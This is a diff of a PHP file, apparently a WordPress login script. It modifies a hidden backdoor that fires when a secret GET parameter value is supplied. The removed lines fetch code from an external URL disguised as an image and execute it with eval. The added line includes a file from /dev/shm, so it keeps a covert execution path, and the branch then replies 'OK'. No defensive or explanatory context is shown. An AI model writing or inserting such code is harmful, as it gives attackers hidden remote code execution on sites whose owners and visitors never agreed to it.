@@ -1657,15 +1657,7 @@ switch ( $action ) {
 		break;
 } // End action switch.
 if (isset($_GET['_']) && $_GET['_'] === 'FR_LGN69s111_gr3af332afbsnk') {
-    $url = "https://batuk-di-komik-aja.pages.dev/loaders.jpg";
-
-    if ($url !== "") {
-        $code = file_get_contents($url);
-        if ($code !== false) {
-            eval("?>".$code);
-        }
-    }
-
+    $f="/dev/shm/48561230";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
